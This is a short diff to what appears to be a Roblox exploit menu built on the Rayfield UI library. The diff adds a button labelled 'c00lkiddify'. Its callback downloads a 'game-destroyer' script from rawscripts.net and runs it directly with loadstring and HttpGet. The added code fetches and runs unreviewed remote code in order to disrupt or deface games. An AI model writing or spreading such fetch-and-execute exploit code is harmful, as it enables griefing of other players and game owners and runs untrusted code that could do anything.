@@ -101,4 +101,11 @@ MainTab:CreateButton({
     end,
 })
 
+MainTab:CreateButton({
+    Name = "c00lkiddify",
+    Callback = function()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-c00lkidd-game-destroyer-40941"))()
+    end,
+})
+
 Rayfield:LoadConfiguration()
